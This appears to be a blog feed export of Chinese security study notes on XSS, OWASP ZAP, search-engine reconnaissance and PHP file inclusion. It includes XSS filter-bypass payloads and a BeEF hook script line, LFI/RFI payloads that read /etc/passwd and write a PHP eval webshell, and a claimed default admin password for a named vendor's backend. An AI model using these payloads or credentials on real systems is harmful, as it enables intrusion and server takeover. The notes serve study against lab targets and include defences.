<p>攻击者发现网站有漏洞，把恶意代码存储在服务器上一个页面上（如发帖，等。当普通用户访问服务器的这个页面后，就会触发。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200518_111605.jpg" alt="流程"></p>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型的XSS脚本是XSS的最危险类型，这是因为恶意脚本被存储在网站的数据库中。 当网站允许用户的输入插入到数据库时​​，又不过滤用户的输入时就会发送存储型xss攻击。如果攻击者发现网站某个输入页面有XSS漏洞，那么攻击者可以把恶意代码存储在服务器上一个页面上（如发帖，等。当普通用户访问服务器的这个页面后，就会触发。这就是存储型XSS攻击。</p>
<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>攻击者构造一个恶意链接发给受害者，恶意代码没有保存在目标网站，而web应用程序原封不动的把恶意脚本返回给受害者的浏览器，受害者的浏览器就会本地解析恶意代码，从而达成攻击效果。</p>
<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>Dom型XSS其实是一种特殊的反射型XSS攻击。它和反射型的区别在于DOM型XSS并不会和后台进行交互，是完完全全的Web前端安全问题，要做防御也只能在客户端上进行防御。</p>
<h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><h3 id="转义用户的输入"><a href="#转义用户的输入" class="headerlink" title="转义用户的输入"></a>转义用户的输入</h3><ol>
<li><p>正则表达式过滤</p>
</li>
<li><p>(使用<code>htmlspecialchars()</code>函数，转义html字符（实体编码，只取样子)</p>
</li>
</ol>
<p>实体化在前端展示的时候，会正常显示&lt;&gt;等字符的样子。但是在源代码中不会解析为标签，会被转为实体化编码，只表示为他原来的样子。</p>
<p>例如：前端显示<code>&lt;</code>，但是在浏览器查看源代码的时候会展示成<code>&amp;lt</code>的实体编码的样子。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$str = <span class="string">"The is aaa &lt;b&gt;BOLD&lt;/b&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>不使用<code>htmlspecialchars()</code>的话就会把BOLD这个单词加粗。因为是<code>&lt;b&gt;</code>标签被识别成了html标签。所以正常输出。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200519_094936.jpg" alt="页面效果"></p>
<p>让我们看看源码，和我们想的是一样的。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_095007.jpg" alt=""></p>
<p>但是如果使用<code>htmlspecialchars()</code>函数的话就会变成这个样子。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200519_095644.jpg" alt=""></p>
<p>所以我们可以看到，如果使用了<code>htmlspecialchars()</code>就不会把<code>&lt;b&gt;</code>标签识别为html标签去解析他，而是正常的去把他原样输出。（你所看到的原样并不是真正的原样。</p>
<p>如果我们再去看它的源代码的话，会发现<code>&lt;b&gt;</code>符号被转成了html的实体编码<code>&amp;lt;b&amp;gt</code>所以这其实不是原样输出。只是你看到的是原样，实际不是。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200519_095956.jpg" alt="sd"></p>
<p>在进行xss攻击的时候，我们更想看到的是第一种效果。标签被识别，能被后端解析。</p>
<h3 id="验证用户的输入"><a href="#验证用户的输入" class="headerlink" title="验证用户的输入"></a>验证用户的输入</h3><p>在用户将他的输入内容，存储在后端前，对用户的输入进行验证。验证输入首先不允许提交某些字符。</p>
<h3 id="httponly防止盗取cookie"><a href="#httponly防止盗取cookie" class="headerlink" title="httponly防止盗取cookie"></a>httponly防止盗取cookie</h3><p>php版本5.2以上可以打开httponly的选项将<code>session.cookie_httponly</code> 设置为1或True.防止用户cookie盗取。</p>
<h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><h3 id="大小写混合"><a href="#大小写混合" class="headerlink" title="大小写混合"></a>大小写混合</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;scRIpt&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;&#x2F;scr&lt;script&gt;ipt&gt;</span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="其他标签绕过"><a href="#其他标签绕过" class="headerlink" title="其他标签绕过"></a>其他标签绕过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;video src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;audio src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
<p>iframe</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;javascript:alert(2)&quot;&gt;</span><br><span class="line">&lt;iframe onload&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
<p>a标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:onclick&#x3D;alert()&quot;&gt;tets&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:alert()&quot;&gt;test&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
<p>利用事件绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg onload&#x3D;alert(1)&gt;</span><br><span class="line">&lt;body onload&#x3D;alert(1)&gt;</span><br><span class="line">&lt;select autofocus onfocus&#x3D;alert(1)&gt;</span><br><span class="line">&lt;textarea autofocus onfocus&#x3D;alert(1)&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>圆括号被过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a onmouseover&#x3D;&quot;javascript:window.onerror&#x3D;alert;throw 1&quot;&gt;</span><br><span class="line">&lt;imgsrc&#x3D;x onerror&#x3D;&quot;javascript:window.onerror&#x3D;alert;throw 1&quot;&gt;</span><br></pre></td></tr></table></figure>

<h2 id="其他的XSS攻击模块"><a href="#其他的XSS攻击模块" class="headerlink" title="其他的XSS攻击模块"></a>其他的XSS攻击模块</h2><h3 id="BeeF"><a href="#BeeF" class="headerlink" title="BeeF"></a>BeeF</h3><p>Kali 2020已经没有预装了，需要手动安装。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install beff-xss</span><br></pre></td></tr></table></figure>
<p><code>http://*****:3000/ui/panel</code><br>默认用户名<code>beef</code>和密码<code>beef</code>。</p>
<p>脚本地址:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;*****:3000&#x2F;hook.js&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="在线xss攻击平台"><a href="#在线xss攻击平台" class="headerlink" title="在线xss攻击平台"></a>在线xss攻击平台</h3><a href="http://xss-payloads.com/" title="" target="">XSS-Payloads</a>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/" title="" target="">浅析DOM型XSS</a></li>
<li><a href="https://tryhackme.com/room/xss#" title="" target="">Cross-site Scripting</a></li>
<li><a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/0.html" title="" target="">那些年我们一起学过的XSS</a></li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>zaproxy工具使用</title>
    <url>/2020/04/20/zaproxy%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><a id="more"></a>

<p><code>zaproxy</code> 又名<code>owasp-zap</code>,不过在最新版kali已没集成所以要手动安装</p>
<p><code>apt install zaproxy -y</code> 进行安装。</p>
<p>这是一个图形化界面工具，相对来说应该还是挺易用的。</p>
<p>最简单的使用方式:<br>    设置好URL to attack后，点击Attack，开始运行。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200420_164003.jpg" alt="gui"></p>
<p>如果看到<code>Web Browser XSS Protection Not Enabled</code>说明网站下有易受XSS跨站攻击的页面。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200420_164222.jpg" alt="xss"></p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Zaproxy</tag>
      </tags>
  </entry>
  <entry>
    <title>华宜网络后台默认密码</title>
    <url>/2020/11/17/%E5%8D%8E%E5%AE%9C%E7%BD%91%E7%BB%9C%E5%90%8E%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>原文链接：<a href="https://mp.weixin.qq.com/s/tqL-3Rgs7TqIUBm-BKN55w" target="_blank" rel="noopener">安逸src-白033</a></p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">账号:lu123</span><br><span class="line">密码:cui123</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201117222437315.png" alt="image-20201117222437315"></p>
<p><img src="https://images.atsud0.me/images/post/image-20201117222450056.png" alt="image-20201117222450056"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
      </categories>
  </entry>
  <entry>
    <title>搜索引擎骇客</title>
    <url>/2020/05/15/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%AA%87%E5%AE%A2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>记录一些搜索引擎的搜索语法.</p>
<ul>
<li>shodan</li>
<li>google</li>
<li>fofa<a id="more"></a>

</li>
</ul>
<h1 id="修改请求头伪造remote-ip"><a href="#修改请求头伪造remote-ip" class="headerlink" title="修改请求头伪造remote ip"></a>修改请求头伪造remote ip</h1><p>在包请求头信息中 添加以下内容<br><code>X-Forwarded-For: 1.1.1.1</code></p>
<p>没有修改请求头之前<br><img src="https://images.atsud0.me/images/post/Screenshot_20200508_103714.jpg" alt="org"></p>
<p>修改请求头,添加一行<br><img src="https://images.atsud0.me/images/post/Screenshot_20200508_104346.jpg" alt="insert"></p>
<p>结果<br><img src="https://images.atsud0.me/images/post/Screenshot_20200508_104427.jpg" alt="res"></p>
<p><code>REMOTE_ADDR</code> 只记录三次握手的IP,不能轻易修改</p>
<h1 id="修改cookie的地方"><a href="#修改cookie的地方" class="headerlink" title="修改cookie的地方"></a>修改cookie的地方</h1><ol>
<li>插件:<code>Cookie Quick Manager</code>(类似其他的插件也可以)</li>
<li>FireFox-开发者工具-Storage-Cookies</li>
<li>Chrome-开发者工具-Application-Storage-Cookies</li>
<li>burpsuite抓包</li>
</ol>
<h1 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h1><h2 id="ASN"><a href="#ASN" class="headerlink" title="ASN"></a>ASN</h2><p>autonomous system number (ASN):大公司一般都会有ASN</p>
<blockquote>
<p>An autonomous system number (ASN) is a global identifier of a range of IP addresses. If you are a very, very large company like Google you will likely have your own ASN for all of the IP addresses you own.<br>自治系统号（ASN）是IP地址范围的全局标识符。 如果是一家非常庞大的公司（例如Google），那么您拥有的所有IP地址都可能拥有自己的ASN。</p>
</blockquote>
<p>查询ASN的网站:<a href="https://www.ultratools.com/tools/asnInfo" target="_blank" rel="noopener">asninfo</a></p>
<p>在shodan上搜索属于该ASN的公司</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ASN:[asnnumber]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Knowing the ASN is helpful, because we can search Shodan for things such as coffee makers or vulnerable computers within our ASN, which we know (if we are a large company) is on our network.<br>知道ASN是有帮助的，因为我们可以在ASN中搜索咖啡机或易受攻击的电脑等设备，我们知道(如果我们是一家大公司)他们就会在我们的网络上。</p>
</blockquote>
<h2 id="基本过滤语法"><a href="#基本过滤语法" class="headerlink" title="基本过滤语法"></a>基本过滤语法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ASN(大公司的自治系统号):[asnnumber]</span><br><span class="line">product:[MySQL&#x2F;Nginx]</span><br><span class="line">vuln:ms17-010 (为了防止被脚本小子滥用,所以只有高级用户才能使用)</span><br><span class="line">City:</span><br><span class="line">Countrty:</span><br><span class="line">Geo(地理坐标): </span><br><span class="line">Hostname:</span><br><span class="line">net(网段):</span><br><span class="line">os:</span><br><span class="line">port:</span><br><span class="line">before&#x2F;after(timeframes):</span><br><span class="line">server:</span><br><span class="line">version(指定软件版本):</span><br><span class="line">org(指定组织):</span><br></pre></td></tr></table></figure>

<h2 id="API使用"><a href="#API使用" class="headerlink" title="API使用"></a>API使用</h2><p><a href="https://help.shodan.io/the-basics/on-demand-scanning" target="_blank" rel="noopener">https://help.shodan.io/the-basics/on-demand-scanning</a></p>
<h1 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h1><p>各种搜索姿势:</p>
<ol>
<li><a href="https://exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">exploit-db-google-hacking-database</a></li>
<li><a href="https://klionsec.github.io/2014/12/14/search-hacking/" target="_blank" rel="noopener">klionsec</a></li>
</ol>
<ul>
<li>intitle: 标题</li>
<li>filetype: 文件类型</li>
<li>site: *.cn</li>
<li>-site : 一级域名.*.cn</li>
<li>intext: 正文文本内容</li>
<li>inurl: 在url中包含的内容</li>
<li>cache: 搜索google缓存的页面</li>
</ul>
<h1 id="FoFA"><a href="#FoFA" class="headerlink" title="FoFA"></a><a href="https://fofa.so/" target="_blank" rel="noopener">FoFA</a></h1><p>官方帮助文档:<a href="https://fofa.so/help" target="_blank" rel="noopener">help</a></p>
<h1 id="信息收集的其他工具"><a href="#信息收集的其他工具" class="headerlink" title="信息收集的其他工具"></a>信息收集的其他工具</h1><h2 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h2><h2 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h2><h2 id="theHarvester"><a href="#theHarvester" class="headerlink" title="theHarvester"></a>theHarvester</h2><h2 id="metasploit的辅助模块"><a href="#metasploit的辅助模块" class="headerlink" title="metasploit的辅助模块"></a>metasploit的辅助模块</h2>]]></content>
      <categories>
        <category>Note</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>GoogleHacking</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含笔记</title>
    <url>/2020/05/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>学习文件包含的笔记。</p>
<a id="more"></a>

<p>文件包含分为</p>
<ul>
<li>LFI本地文件包含</li>
<li>RFI远程文件包含</li>
</ul>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>LFI是本地文件包含漏洞，本地文件包含漏洞是指只能包含本机文件的文件包含漏洞，当Web应用程序未合理的包含一个文件时，存在此漏洞。攻击者可以控制输入注入路径遍历字符或服务器上其他文件进行攻击。<strong>文件包含不在意包含文件的后缀名，只要检测包含文件的内容中有php代码，就会以php方式解析执行。</strong>这也是能利用文件包含包含图片马的原因。</p>
<p>LFI漏洞很容易识别，比如:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;tryhackme.com&#x2F;?file&#x3D;robots.txt</span><br></pre></td></tr></table></figure>

<p>以及:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;lfi.php?file&#x3D;index.html</span><br></pre></td></tr></table></figure>

<p>所以我们可以通过操作文件位置来利用，比如:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;home?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;home?page&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p>以此来访问系统上的<code>/etc/passwd/</code>文件.</p>
<p>漏洞的起因在于</p>
<ul>
<li>include()等函数通过动态变量的方式引入需要包含的文件，然后该变量能被用户控制。</li>
</ul>
<p>最简单的存在LFI漏洞代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h3><p>RFI就是远程文件包含。<br>需要目标服务器打开<code>allow_url_include</code>配置，这个配置项是默认关闭的。</p>
<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ol>
<li>敏感信息泄露（相对路径&amp;绝对路径都可以</li>
<li>获取webshell<ol>
<li>直接一句话</li>
<li>使用fwrite或fputs生成一句话</li>
<li>日志文件中毒</li>
</ol>
</li>
<li>任意命令执行</li>
</ol>
<h3 id="后端限制"><a href="#后端限制" class="headerlink" title="后端限制"></a>后端限制</h3><p>如果后端限制了包含文件的后缀名（自动给输入的变量加上一个后缀(.html或.php)什么的，这时可以使用00截断。</p>
<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h4><p>用法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;[文件的绝对路径]</span><br></pre></td></tr></table></figure>
<p>如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;home.php?page&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;home.php?page&#x3D;file:&#x2F;&#x2F;D:&#x2F;111.txt</span><br></pre></td></tr></table></figure>

<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>常用于读取文件/源码。<br>不用base64编码直接使用的时候，不能查看源码。用法如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;home.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;config.php 查看文件的源代码</span><br></pre></td></tr></table></figure>

<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>input会把post的代码当作php脚本来执行，所以要抓包post恶意php代码。</p>
<p>抓包在post中输入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fwrite(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[a])?&gt;'</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果能使用<code>php://input</code>伪协议，但是不能生成文件怎么直接用菜刀/蚁剑getshell?</p>
<p>菜刀:<br>这办法只有菜刀能用。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_185510.jpg" alt=""></p>
<p>蚁剑:<br>这办法菜刀也能用。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_185320.jpg" alt=""></p>
<p>post的参数都可以丢到连接密码里。</p>
<h4 id="zip伪协议"><a href="#zip伪协议" class="headerlink" title="zip伪协议"></a>zip伪协议</h4><p>zip伪协议<br>利用zip读取压缩包的文件,解压的压缩包后缀是什么没关系.<br>zip://绝对路径/压缩包文件名%23被压缩文件的文件名(%23是<code>#</code>)</p>
<h4 id="伪协议总结"><a href="#伪协议总结" class="headerlink" title="伪协议总结"></a>伪协议总结</h4><table>
<thead>
<tr>
<th>协议</th>
<th>php版本</th>
<th>allow_url_fopen</th>
<th>allow_url_include</th>
<th>用法</th>
</tr>
</thead>
<tbody><tr>
<td>file://</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td>off/on</td>
<td>?page=file:///etc/passwd</td>
</tr>
<tr>
<td>php://filter</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td>off/on</td>
<td>?page=php://filter/read=convert.base64-encode/resource=./config.php</td>
</tr>
<tr>
<td>php://input</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td>on</td>
<td>?page=php://input [post] <?php fwrite(fopen('shell.php','w'),'<?php eval($_POST[a])?>‘)?&gt;</td>
</tr>
<tr>
<td>zip://</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td>off/on</td>
<td>?page=zip:///var/www/html/upload/file.zip%23phpcode.txt</td>
</tr>
<tr>
<td>bzip2://</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td>off/on</td>
<td></td>
</tr>
<tr>
<td>zlib://</td>
<td>&gt;=5.2</td>
<td>off/on</td>
<td>off/on</td>
<td></td>
</tr>
<tr>
<td>data://</td>
<td>&gt;=5.2</td>
<td>on</td>
<td>on</td>
<td>?page=data://text/plain,<?php phpinfo()?></td>
</tr>
</tbody></table>
<h3 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h3><h4 id="包含图片马"><a href="#包含图片马" class="headerlink" title="包含图片马"></a>包含图片马</h4><p>文件包含不在意包含的文件的后缀名字,只要检测到php代码则会以php方式解析</p>
<h4 id="LFI日志文件中毒"><a href="#LFI日志文件中毒" class="headerlink" title="LFI日志文件中毒"></a>LFI日志文件中毒</h4><p>如果能访问目标系统的<code>apache</code>日志，那么我们可以考虑使用这个日志文件中毒的方式来执行系统命令，或插入一句话。<br>日志文件中毒要求对目录应该具有读和执行权限。<br>使用日志文件中毒执行系统命令<code>ls /var/www/html/lfi</code>命令，注意要使用url编码将空格和斜杠转义。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200520_214305.jpg" alt="ls"></p>
<p>插入一句话<br><img src="https://images.atsud0.me/images/post/Screenshot_20200520_214506.jpg" alt="yijuhua"></p>
<h4 id="RFI包含生成一句话"><a href="#RFI包含生成一句话" class="headerlink" title="RFI包含生成一句话"></a>RFI包含生成一句话</h4><p>目标机器:192.168.40.133，存在远程包含文件漏洞（靶场pikachu<br>目标漏洞url：<code>http://192.168.40.133/pikachu/vul/fileinclude/fi_remote.php?filename=include%2Ffile2.php&amp;submit=Submit</code><br>利用方式：将<code>filename=include...</code>处修改为：<code>filename={攻击机器的url}/{生成一句话的文件的文本}</code><br>例如我的攻击机上面的文件为：newshell.php内容为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'czxcshell.php'</span>,<span class="string">'a+'</span>),<span class="string">'&lt;?php eval($_POST[a])?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>想让这个文件成功的被包含，那么就要将这这个<code>newshell.php</code>改名为<code>newshell.txt</code>再包含。最后构造的payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.40.133&#x2F;pikachu&#x2F;vul&#x2F;fileinclude&#x2F;fi_remote.php?filename&#x3D;http:&#x2F;&#x2F;192.168.40.123&#x2F;newshell.txt&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p>现在尝试访问该路径下的<code>czxshell.php</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200613_212318.jpg" alt=""><br>这里不改名也行，只要你的网站没有php环境就可以了。</p>
<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="限制特定字符"><a href="#限制特定字符" class="headerlink" title="限制特定字符"></a>限制特定字符</h4><p>如果限制了特定的文件字符的话,如<br><a href="http://127.0.0.1/?page=cat" target="_blank" rel="noopener">http://127.0.0.1/?page=cat</a><br>如果服务器限制了只能输入cat和dog的话.恰巧又有一个dogs的目录那就<br><a href="http://127.0.0.1/?page=./cats/../flag.txt" target="_blank" rel="noopener">http://127.0.0.1/?page=./cats/../flag.txt</a></p>
<h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p>00截断是利用了php的一个漏洞。漏洞编号为<code>CVE-2015-2348</code>。使用前提要求较为严格。</p>
<ol>
<li>服务器<code>php</code>版本小于<code>5.3</code></li>
<li>魔术引号<code>gpc</code>处于关闭状态</li>
<li>要求上传路径可控</li>
</ol>
<p>在url最后加入%00截断</p>
<h4 id="截断"><a href="#截断" class="headerlink" title="./截断"></a>./截断</h4><p>利用多个英文句号(.)和反斜杆(/)来截断。不受GPC限制，但是在PHP5.3之后被修复</p>
<h4 id="伪截断"><a href="#伪截断" class="headerlink" title="?伪截断"></a>?伪截断</h4><p>这个使用要求也是很严格的。要求可以远程文件包含，但是远程文件包含的配置项一般是默认关闭的。本地包含使用伪截断是不会成功的。</p>
<p>文件代码：</p>
<figure class="highlight php"><figcaption><span>VAuditDemo-index.php</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">/* Include */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'module'</span>]))&#123;</span><br><span class="line">		<span class="keyword">include</span>($_GET[<span class="string">'module'</span>].<span class="string">'.inc'</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	&lt;div class="jumbotron" style="text-align: center;"&gt;</span><br><span class="line">		&lt;h1&gt;&lt;b&gt;VAuditDemo&lt;/b&gt;&lt;/h1&gt;</span><br><span class="line">		&lt;p&gt;一个简单的Web漏洞演练平台&lt;/p&gt;&lt;br /&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;div class="col-lg-12"&gt;</span><br><span class="line">		&lt;h2&gt;用於演示講解PHP基本漏洞&lt;/h2&gt;</span><br><span class="line">		&lt;p&gt;&lt;/p&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.40.123&#x2F;?module&#x3D;http:&#x2F;&#x2F;localhost&#x2F;yjh.php?</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200615_172129.jpg" alt=""></p>
<blockquote>
<p>都能远程包含了为什么还要伪截断..直接包含远程的inc文件不就好了吗…:(</p>
</blockquote>
<h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><ol>
<li>设置白名单</li>
<li>过滤危险字符</li>
<li>关闭危险配置<ol>
<li>allow_url_include=off</li>
</ol>
</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.jianshu.com/p/8803aff98bfa" title="" target="">LFI&#x2F;RFI初学者指南</a></li>
<li><a href="https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks" target="_blank" rel="noopener">基础LFI查询</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" target="_blank" rel="noopener">LFI</a></li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>LFI</tag>
        <tag>RFI</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞学习笔记</title>
    <url>/2020/05/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
